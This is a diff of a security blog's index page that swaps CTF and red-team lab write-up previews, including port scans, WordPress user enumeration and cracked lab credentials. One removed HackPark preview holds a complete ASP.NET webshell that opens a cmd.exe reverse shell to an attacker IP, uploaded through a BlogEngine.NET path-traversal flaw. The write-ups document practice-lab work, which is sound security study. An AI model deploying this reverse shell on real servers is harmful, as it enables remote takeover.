@@ -137,11 +137,108 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/09/16/长城杯京津冀2024初赛/" >长城杯京津冀2024初赛</a>
+			<a href="/2024/10/05/ATT&CK红队评估实战靶场-3/" >ATT&amp;CK红队评估实战靶场-3</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2024-09-16  </div>
+		<div class="date">post @ 2024-10-05  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">漏洞详情 (qiyuanxuetang.net)</a></p>
+</blockquote>
+<p>打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。</p>
+<h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><p>VMnet2和VMnet3配置如图所示<br><img src="/Rxi134_FILE/986298e29ccae5da90aa4f70ef4a1f12_MD5.jpeg"></p>
+<p>然后启动所有虚拟机，并设置centos一个NAT网卡，同时重启网络服务</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> network restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>黑盒模式，没有账密</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>先扫端口</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)
+|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)
+80/tcp   open  http    nginx 1.9.4
+|_http-title: Home
+|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
+|_http-generator: Joomla! - Open Source Content Management
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.9.4
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.27-0ubuntu0.16.04.1
+|   Thread ID: 13
+|   Capabilities flags: 63487
+|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, ODBCClient, SupportsCompression, Support41Auth, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: \x11L>y\x0F&#123;>JK\x1AE3i \x1F=U6\x01\x04
+|_  Auth Plugin Name: mysql_native_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2024/10/05/ATT&CK红队评估实战靶场-3/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/09/27/ATT&CK红队评估实战靶场-1/" >ATT&amp;CK红队评估实战靶场-1</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-09-27  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">漏洞详情 (qiyuanxuetang.net)</a></p>
+</blockquote>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>网络拓扑：<br><img src="/Rxi134_FILE/d7dd99fe113508cbf08ada16b18c69ca_MD5.jpeg"></p>
+<p>初始的密码都是 <code>hongrisec@2019</code>，部分可能要重置密码</p>
+<p>域环境的网段是写死的 192.168.52.0&#x2F;24</p>
+<p>在C盘找到 phpstudy 启动服务<br><img src="/Rxi134_FILE/66b08c3cd34492516801ae06253b9624_MD5.jpeg"></p>
+<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="phpmyadmin写马"><a href="#phpmyadmin写马" class="headerlink" title="phpmyadmin写马"></a>phpmyadmin写马</h2><p>访问站点是一个 phpstudy 探针<br><img src="/Rxi134_FILE/6a6179b7a8c5d2368b842b6ea8ae7a36_MD5.jpeg"></p>
+<p>扫下端口，注意开了 3306 端口<br><img src="/Rxi134_FILE/605b2a9714c8e53b1cdc7c48b6fb558d_MD5.jpeg"><br>有防火墙</p>
+	
+	</div>
+  <a type="button" href="/2024/09/27/ATT&CK红队评估实战靶场-1/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/09/18/长城杯京津冀2024初赛/" >长城杯京津冀2024初赛</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-09-18  </div>
 		</div>
 	</div>
 	
@@ -227,10 +324,6 @@
 	lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr 	<span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
 
 	pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-
 
 
 <h1 id="Kylin-Heap：libc2-31-无限制UAF"><a href="#Kylin-Heap：libc2-31-无限制UAF" class="headerlink" title="Kylin_Heap：libc2.31 无限制UAF"></a>Kylin_Heap：libc2.31 无限制UAF</h1><p>直接tcache 打 __free_hook</p>
@@ -341,7 +434,7 @@
 <p>有个坑点是 error() 函数除了输出“out!”并没有什么用处，但我先入为主以为会exit，白耗了很长时间，nm<br><img src="/EXP_FILE/4577a05dba2432dd602cae7dc5d8c078_MD5.jpeg"></p>
 	
 	</div>
-  <a type="button" href="/2024/09/16/长城杯京津冀2024初赛/#more" class="btn btn-default more">Read More</a>
+  <a type="button" href="/2024/09/18/长城杯京津冀2024初赛/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -351,367 +444,11 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2024/07/30/Blog/" title="我就说二进制有用">Blog</a>
+			<a href="/2024/06/21/CISCN2024华中赛区选拔赛/" >CISCN2024华中赛区选拔赛</a>
 		</h3>
 		</div>
 	<div class="col-md-4">
-		<div class="date">post @ 2024-07-30  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>👍，这个网站多半是 billy 的<br><img src="/Red_FILE/1d61294e726a3a67195cb61816eb5865_MD5.jpeg"></p>
-<p>CMS是WordPress 5.0 ，进入后台<br><img src="/Red_FILE/84213a721aef84f5c5ed6bb587b26211_MD5.jpeg"><img src="/Red_FILE/f3c123c9f3ce17dcc02699dfbcf09f04_MD5.jpeg"></p>
-<p>wpscan，探测下用户名</p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">[i] User(s) Identified:
-
-[+] kwheel
- | Found By: Author Posts - Author Pattern (Passive Detection)
- | Confirmed By:
- |  Wp Json Api (Aggressive Detection)
- |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
- |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
-
-[+] bjoel
- | Found By: Author Posts - Author Pattern (Passive Detection)
- | Confirmed By:
- |  Wp Json Api (Aggressive Detection)
- |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
- |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
-
-[+] Karen Wheeler
- | Found By: Rss Generator (Passive Detection)
- | Confirmed By: Rss Generator (Aggressive Detection)
-
-[+] Billy Joel
- | Found By: Rss Generator (Passive Detection)
- | Confirmed By: Rss Generator (Aggressive Detection)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>测试后得到用户名是这三个<br><img src="/Red_FILE/c30867a18e36c4eff754997a14778726_MD5.jpeg"><br><img src="/Red_FILE/0b66ea0f5173c245478fe12918496711_MD5.jpeg"></p>
-<p>爆破拿到后台登录账密 <code>kwheel:cutiepie1</code><br><img src="/Red_FILE/4620bdb86e1af572400c35f6f347a7e4_MD5.jpeg"></p>
-<p>这是个低权限账户，不能修改plugin<br><img src="/Red_FILE/0e37a1a4e0adac8cbdb9d5c2bc9350bd_MD5.jpeg"></p>
-<p>查下CVE<br><img src="/Red_FILE/efe290015f01c53c3ba1e4ac00bdfe15_MD5.jpeg"><br>利用crop拿到webshell<br><img src="/Red_FILE/24a7fd30575a27d717b0e46742e06476_MD5.jpeg"></p>
-<p>利用python启一个伪终端</p>
-	
-	</div>
-  <a type="button" href="/2024/07/30/Blog/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/07/18/HackPark/" title="踩到猫了">HackPark</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-07-18  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p><img src="/Red_FILE/48b909034099d6a6ef9a4f80719bf65d_MD5.jpeg"></p>
-<p>只开了80和3389端口</p>
-<p>一个登录界面<br><img src="/Red_FILE/192635cd562ac8547a8652c5429e2237_MD5.jpeg"><br>爆一下弱口令，运气不错~：<code>admin:1qaz2wsx</code><br><img src="/Red_FILE/9d2e663b0406290262abb4905b2d1fa7_MD5.jpeg"></p>
-<p>登录后台，使用的框架是 BlogEngine.NET 3.3.6.0<br><img src="/Red_FILE/cdfa836ce2695885b360eef7e0afac0d_MD5.jpeg"></p>
-<p>searchsploit 有历史CVE，CVE-2019-6714<br><img src="/Red_FILE/e3d669d666d559346ec7757c4a84c9cf_MD5.jpeg"></p>
-<p>msf并没有自动利用的脚本，直接手撸吧，漏洞点在 theme 模块。在文章发布页面 （&#x2F;admin&#x2F;app&#x2F;editor&#x2F;editpost.cshtml） 可以上传一个 PostView.ascx 格式的 webshell，然后访问 &#x2F;?theme&#x3D;..&#x2F;..&#x2F;App_Data&#x2F;files 激活<br><img src="/Red_FILE/69f3f8074d78ffb7b88bb8d76d0ce2a8_MD5.jpeg"><br><img src="/Red_FILE/536ccdfbaa739cda90c35da8dbc1e852_MD5.jpeg"></p>
-<pre class="line-numbers language-csharp" data-language="csharp"><div class="caption"><span>TI:"PostView.ascx"</span></div><code class="language-csharp"><span class="token operator">&lt;</span><span class="token operator">%</span>@ <span class="token class-name">Control</span> Language<span class="token operator">=</span><span class="token string">"C#"</span> AutoEventWireup<span class="token operator">=</span><span class="token string">"true"</span> EnableViewState<span class="token operator">=</span><span class="token string">"false"</span> Inherits<span class="token operator">=</span><span class="token string">"BlogEngine.Core.Web.Controls.PostViewBase"</span> <span class="token operator">%</span><span class="token operator">></span>
-<span class="token operator">&lt;</span><span class="token operator">%</span>@ <span class="token class-name">Import</span> Namespace<span class="token operator">=</span><span class="token string">"BlogEngine.Core"</span> <span class="token operator">%</span><span class="token operator">></span>
-
-<span class="token operator">&lt;</span><span class="token class-name">script</span> runat<span class="token operator">=</span><span class="token string">"server"</span><span class="token operator">></span>
-	<span class="token keyword">static</span> <span class="token class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamWriter</span> streamWriter<span class="token punctuation">;</span>
-
-    <span class="token keyword">protected</span> <span class="token keyword">override</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">OnLoad</span><span class="token punctuation">(</span><span class="token class-name">EventArgs</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-        <span class="token keyword">base</span><span class="token punctuation">.</span><span class="token function">OnLoad</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-	<span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span> client <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Sockets<span class="token punctuation">.</span>TcpClient</span><span class="token punctuation">(</span><span class="token string">"10.11.84.153"</span><span class="token punctuation">,</span> <span class="token number">4445</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>Stream</span> stream <span class="token operator">=</span> client<span class="token punctuation">.</span><span class="token function">GetStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-			<span class="token keyword">using</span><span class="token punctuation">(</span><span class="token class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamReader</span> rdr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamReader</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-				streamWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>IO<span class="token punctuation">.</span>StreamWriter</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
-						
-				<span class="token class-name">StringBuilder</span> strInput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-				<span class="token class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"cmd.exe"</span><span class="token punctuation">;</span>
-				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>CreateNoWindow <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
-				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardInput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-				p<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardError <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
-				p<span class="token punctuation">.</span>OutputDataReceived <span class="token operator">+=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>DataReceivedEventHandler</span><span class="token punctuation">(</span>CmdOutputDataHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
-				p<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-				p<span class="token punctuation">.</span><span class="token function">BeginOutputReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-				<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-					strInput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>rdr<span class="token punctuation">.</span><span class="token function">ReadLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-					p<span class="token punctuation">.</span>StandardInput<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strInput<span class="token punctuation">)</span><span class="token punctuation">;</span>
-					strInput<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> strInput<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>
-				<span class="token punctuation">&#125;</span>
-			<span class="token punctuation">&#125;</span>
-		<span class="token punctuation">&#125;</span>
-    	<span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">CmdOutputDataHandler</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sendingProcess<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>Diagnostics<span class="token punctuation">.</span>DataReceivedEventArgs</span> outLine<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-   	<span class="token class-name">StringBuilder</span> strOutput <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-       	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>String<span class="token punctuation">.</span><span class="token function">IsNullOrEmpty</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-       		<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
-                	strOutput<span class="token punctuation">.</span><span class="token function">Append</span><span class="token punctuation">(</span>outLine<span class="token punctuation">.</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    	streamWriter<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>strOutput<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    	streamWriter<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-    <span class="token punctuation">&#125;</span>
-
-<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-<span class="token operator">&lt;</span>asp<span class="token punctuation">:</span><span class="token class-name">PlaceHolder</span> ID<span class="token operator">=</span><span class="token string">"phContent"</span> runat<span class="token operator">=</span><span class="token string">"server"</span> EnableViewState<span class="token operator">=</span><span class="token string">"false"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>asp<span class="token punctuation">:</span>PlaceHolder<span class="token operator">></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>成功反弹shell<br><img src="/Red_FILE/7e2075335b9e6db1f1de19824553a7e1_MD5.jpeg"></p>
-<p>x64 的 win server 2012<br><img src="/Red_FILE/f265b6ae28e465c4f6af68e04120b9a3_MD5.jpeg"></p>
-	
-	</div>
-  <a type="button" href="/2024/07/18/HackPark/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/07/17/Vulnhub-GOLDENEYE/" >Vulnhub-GOLDENEYES</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-07-17  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><blockquote>
-<p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/#networking">黄金眼：1 ~ VulnHub — GoldenEye: 1 ~ VulnHub</a></p>
-</blockquote>
-<p>探测到靶机ip<br><img src="/Red_FILE/764c1b125b1d468c2d09ab81eb511066_MD5.jpeg"></p>
-<p>先扫扫端口叭<br>开了25、80端口</p>
-<p><img src="/Red_FILE/3a9ad0529e3fc6a10d84a32a837ee647_MD5.jpeg"><br>提示在&#x2F;sev-home&#x2F;登录<br><img src="/Red_FILE/41cadb50e3c6efa9fba59d2787a8703c_MD5.jpeg"><br>简单试了几个弱口令，没进去</p>
-<p>目录也没扫出什么</p>
-<p>注意到这是admin server，尝试爆下密码<br><img src="/Red_FILE/6110e77c5cc8b3d1b995dc93338c9bdf_MD5.jpeg"><br>但是在抓包时发现并没有传参，离谱，难道是前端验证？</p>
-<p>去看看源代码，在 terminal.js 还真有一段注释的信息：<br><img src="/Red_FILE/6d93258b7be2181235450c1cd30145ef_MD5.jpeg"></p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">//
-//Boris, make sure you update your default password. 
-//My sources say MI6 maybe planning to infiltrate. 
-//Be on the lookout for any suspicious network traffic....
-//
-//I encoded you p@ssword below...
-//
-//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;
-//
-//BTW Natalya says she can break your codes
-//<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>可见这个server的用户名很可能是Boris，密码一眼ascii。解码得到：<code>InvincibleHack3r</code></p>
-	
-	</div>
-  <a type="button" href="/2024/07/17/Vulnhub-GOLDENEYE/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/07/10/Alfred/" >Alfred</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-07-10  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>常规扫端口</p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">80
-8080
-3389<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>80端口是个静态页面<br><img src="/Red_FILE/c7a4f24df2493fc7020ca80e71b8565b_MD5.jpeg"></p>
-<pre class="line-numbers language-text" data-language="text"><code class="language-text">愿逝者安息，布鲁斯·韦恩。 
-
-将捐款发送至 alfred@wayneenterprises.com 将得到我们的衷心感谢<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>在8080端口有个登录界面<br><img src="/Red_FILE/bc60287cf8ee6287175ab6dcedba8757_MD5.jpeg"></p>
-<p>admin:admin直接进来了<br><img src="/Red_FILE/5e020b9f9ae6314b3c2b805a9f50a7bd_MD5.jpeg"></p>
-<h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>网站是一个项目管理界面，功能比较复杂，探索了好一会</p>
-<p>这是一个x86的 win7 系统<br><img src="/Red_FILE/60aeeea2adbe5c72beef763344a10989_MD5.jpeg"></p>
-	
-	</div>
-  <a type="button" href="/2024/07/10/Alfred/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2024/07/09/强网杯2020 easyoverflow/" title="I hate windows">强网杯2020 easyoverflow</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2024-07-09  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p><img src="/EXP_FILE/a15bee592aac18b05e22dcae4e48850f_MD5.jpeg"><br>打开了DEP、GS、dynamicbase、SEH</p>
-<p>程序比较简单，有三次栈溢出，并通过puts打印到屏幕上</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  FILE <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
-  FILE <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>
-  FILE <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>
-  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
-  <span class="token keyword">char</span> DstBuf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-118h] BYREF</span>
-
-  v3 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">setbuf</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v4 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">setbuf</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v5 <span class="token operator">=</span> <span class="token function">_acrt_iob_func</span><span class="token punctuation">(</span><span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">setbuf</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token number">0u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  v6 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
-  <span class="token keyword">do</span>
-  <span class="token punctuation">&#123;</span>
-    <span class="token operator">--</span>v6<span class="token punctuation">;</span>
-    <span class="token function">memset</span><span class="token punctuation">(</span>DstBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>DstBuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> DstBuf<span class="token punctuation">,</span> <span class="token number">0x400u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
